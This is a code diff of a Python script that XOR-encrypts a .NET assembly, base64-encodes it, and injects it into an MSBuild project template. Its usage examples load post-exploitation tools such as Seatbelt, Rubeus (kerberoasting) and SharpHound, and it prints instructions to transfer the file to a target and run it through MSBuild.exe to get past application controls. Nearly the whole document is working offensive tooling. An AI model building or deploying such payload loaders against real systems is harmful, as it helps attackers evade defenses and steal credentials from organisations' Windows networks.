@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
 """
-build_msbuild.py — Encrypts a .NET assembly and injects it into msbuild_payload.csproj
+build_msbuild.py -- Encrypts a .NET assembly and injects into msbuild_payload.csproj
 
 Usage:
   python build_msbuild.py <assembly_path> [options] [-- <assembly_args>...]
@@ -10,13 +10,13 @@ Usage:
 Examples:
   python build_msbuild.py Seatbelt.exe -- -group=all
   python build_msbuild.py Rubeus.exe -- kerberoast
-  python build_msbuild.py SharpHound.exe -o ready.csproj -- -c All -o C:\\Windows\\Temp\\out.zip
+  python build_msbuild.py SharpHound.exe -o ready.csproj -- -c All
   python build_msbuild.py Seatbelt.exe --key deadbeefcafebabe1234567890abcdef
 """
 
 import argparse
+import base64
 import os
-import re
 import sys
 
 
@@ -24,30 +24,7 @@ def xor_encrypt(data: bytes, key: bytes) -> bytes:
     return bytes(b ^ key[i % len(key)] for i, b in enumerate(data))
 
 
-def format_cs_array(data: bytes, indent: str = "        ") -> str:
-    lines = []
-    for i in range(0, len(data), 16):
-        chunk = data[i:i + 16]
-        hex_str = ", ".join(f"0x{b:02x}" for b in chunk)
-        if i + 16 < len(data):
-            hex_str += ","
-        lines.append(f"{indent}{hex_str}")
-    return "\n".join(lines)
-
-
-def format_cs_args(args: list[str], indent: str = "        ") -> str:
-    if not args:
-        return ""
-    entries = []
-    for arg in args:
-        escaped = arg.replace("\\", "\\\\").replace('"', '\\"')
-        entries.append(f'{indent}"{escaped}",')
-    return "\n".join(entries)
-
-
 def main():
-    # Split argv on "--" so everything after it becomes assembly args
-    # This avoids argparse choking on assembly args that start with -
     argv = sys.argv[1:]
     assembly_args = []
     if "--" in argv:
@@ -63,11 +40,8 @@ def main():
     parser.add_argument("-o", "--output", help="Output file (default: msbuild_ready.csproj)")
     parser.add_argument("--template", help="Template csproj (default: msbuild_payload.csproj)")
     args = parser.parse_args(argv)
-    args.args = assembly_args
 
-    # Resolve paths relative to script directory
     script_dir = os.path.dirname(os.path.abspath(__file__))
-
     template_path = args.template or os.path.join(script_dir, "msbuild_payload.csproj")
     output_path = args.output or os.path.join(script_dir, "msbuild_ready.csproj")
 
@@ -79,62 +53,48 @@ def main():
         print(f"[-] Template not found: {template_path}", file=sys.stderr)
         sys.exit(1)
 
-    # Read assembly
     with open(args.assembly, "rb") as f:
         assembly_bytes = f.read()
     print(f"[*] Assembly: {args.assembly} ({len(assembly_bytes)} bytes)", file=sys.stderr)
 
-    # Generate or parse key
     if args.key:
         key = bytes.fromhex(args.key)
     else:
         key = os.urandom(16)
     print(f"[*] XOR key: {key.hex()}", file=sys.stderr)
 
-    # Encrypt
     encrypted = xor_encrypt(assembly_bytes, key)
 
-    # Format as C# byte arrays
-    encrypted_cs = format_cs_array(encrypted)
-    key_cs = format_cs_array(key)
+    encrypted_b64 = base64.b64encode(encrypted).decode("ascii")
+    key_b64 = base64.b64encode(key).decode("ascii")
 
-    # Format args
-    args_cs = format_cs_args(args.args)
+    print(f"[*] Encrypted payload: {len(encrypted_b64)} chars base64", file=sys.stderr)
 
-    # Read template
     with open(template_path, "r") as f:
         template = f.read()
 
-    # Replace the encryptedAssembly placeholder
-    template = re.sub(
-        r'(static byte\[\] encryptedAssembly = new byte\[\] \{)\s*\n\s*// PASTE ENCRYPTED ASSEMBLY BYTES HERE\s*\n\s*0x00\s*// placeholder\s*\n(\s*\};)',
-        rf'\1\n{encrypted_cs}\n\2',
-        template
-    )
+    # Replace payload placeholder
+    template = template.replace('"YOURPAYLOADHERE"', f'"{encrypted_b64}"')
 
-    # Replace the xorKey placeholder
-    template = re.sub(
-        r'(static byte\[\] xorKey = new byte\[\] \{)\s*\n\s*// PASTE XOR KEY HERE\s*\n\s*0x00\s*// placeholder\s*\n(\s*\};)',
-        rf'\1\n{key_cs}\n\2',
-        template
-    )
+    # Replace key placeholder
+    template = template.replace('"YOURKEYHERE"', f'"{key_b64}"')
 
-    # Replace the args placeholder
-    if args_cs:
-        template = re.sub(
-            r'(static string\[\] assemblyArgs = new string\[\] \{)\s*\n\s*// "-group=all",\s*\n\s*// "-outputfile=C:\\\\Windows\\\\Temp\\\\out\.txt",\s*\n(\s*\};)',
-            rf'\1\n{args_cs}\n\2',
-            template
-        )
+    # Replace args placeholder
+    if assembly_args:
+        args_lines = []
+        for arg in assembly_args:
+            escaped = arg.replace("\\", "\\\\").replace('"', '\\"')
+            args_lines.append(f'        "{escaped}",')
+        args_str = "\n".join(args_lines)
+        template = template.replace("        // YOURARGS", args_str)
 
-    # Strip any non-ASCII characters that could corrupt during transfer
+    # Write as pure ASCII
     template = template.encode("ascii", errors="ignore").decode("ascii")
-
-    # Write output as ASCII to prevent encoding issues on Windows
     with open(output_path, "w", encoding="ascii") as f:
         f.write(template)
 
-    print(f"[+] Written: {output_path}", file=sys.stderr)
+    size_kb = os.path.getsize(output_path) / 1024
+    print(f"[+] Written: {output_path} ({size_kb:.0f} KB)", file=sys.stderr)
     print(f"[*] Transfer to target and run:", file=sys.stderr)
     print(f"    C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\MSBuild.exe {os.path.basename(output_path)}", file=sys.stderr)
 
